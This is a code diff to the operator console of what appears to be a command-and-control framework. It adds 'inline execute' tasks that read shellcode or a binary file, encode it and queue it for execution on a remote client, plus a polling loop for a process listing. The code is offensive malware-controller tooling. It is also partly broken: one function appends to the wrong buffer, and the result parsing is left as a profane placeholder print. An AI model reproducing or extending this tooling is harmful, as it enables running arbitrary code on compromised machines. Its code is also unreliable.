@@ -1,14 +1,15 @@
 import time
 import base64
+import struct
 
 from lib import logging
 
 ##
 ## Command to execute
 ##
-COMMAND_HELLO             = 0
-COMMAND_EXITFREE          = 1
-COMMAND_EXECUTE_SHELLCODE = 2
+COMMAND_HELLO           = 0
+COMMAND_EXITFREE        = 1
+COMMAND_INLINE_EXECUTE  = 2
 
 ##
 ## Executes Hello, and returns the result
@@ -107,5 +108,100 @@ def Task_ExitFree( WebObj, ClientObj, Block, Args ):
             ## Warn the client
             ##
             logging.warn( 'Unable to block for the exit command.' );
+    except Exception as e:
+        logging.error( e );
+
+##
+## Executes InlineTask and returns the result
+##
+def Task_InlineExecute( WebObj, ClientObj, Block, Args ):
+    try:
+        ##
+        ## Create an InlineExecute Task
+        ##
+        buf  = Args.file.read()
+        pkt  = struct.pack( '!II', len( buf ), 0 );
+        pkt += buf
+        pkt += b''
+
+        Tsk = WebObj.new_task( {
+            'code': COMMAND_INLINE_EXECUTE,
+            'callback': 0,
+            'target_id': ClientObj['id'],
+            'args': { 'buffer': '{}'.format( base64.b64encode( pkt ).decode() ) }
+        } );
+
+        logging.success( 'Tasked to execute inline-execute' );
+
+        ##
+        ##
+        ##
+        if Block:
+            logging.warn( 'Unable to block for inline-execute' );
+    except Exception as e:
+        logging.error( e );
+
+##
+## Executes 'processlist' as InlineTask and return the result
+##
+def Task_InlineExecute_ProcessList( WebObj, ClientObj, Block, Args ):
+    try:
+        ##
+        ## Create an InlineExecute Task
+        ##
+        buf  = Args.shellcode.read()
+        pkt  = struct.pack( '!II', len( buf ), 0 );
+        pkt += buf
+        buf += b''
+
+        Tsk = WebObj.new_task( {
+            'code': COMMAND_INLINE_EXECUTE,
+            'callback': 0,
+            'target_id': ClientObj['id'],
+            'args': { 'buffer': '{}'.format( base64.b64encode( pkt ).decode() ) }
+        } );
+
+        logging.success( 'Tasked to inline-execute processlist' );
+
+        ##
+        ##
+        ##
+        if Block:
+            ##
+            ## Create a tabulate table of this information
+            ##
+            while True:
+                ##
+                ## Extract the current task
+                ##
+                Obj = WebObj.get_task( str( Tsk['id'] ) )[0];
+
+                ##
+                ## Check the status
+                ##
+                if Obj['status'] == 3:
+                    ##
+                    ## Print 
+                    ##
+                    logging.success( 'Task was executed successfully and returned code {}'.format( Obj['return_code'] ) );
+
+                    if Obj['return_data']:
+                        ##
+                        ## Create tabulate table and print it.
+                        ##
+                        Buf = base64.b64decode( Obj['return_data'] );
+                        Hdr = [ "Process Name", "PID", "PPID" ]
+
+                        ##
+                        ## Extract each value
+                        ##
+                        print('FUCK ME!');
+                    else:
+                        logging.error( 'No return data was recieved' );
+
+                    ##
+                    ## Abort
+                    ##
+                    break;
     except Exception as e:
         logging.error( e );
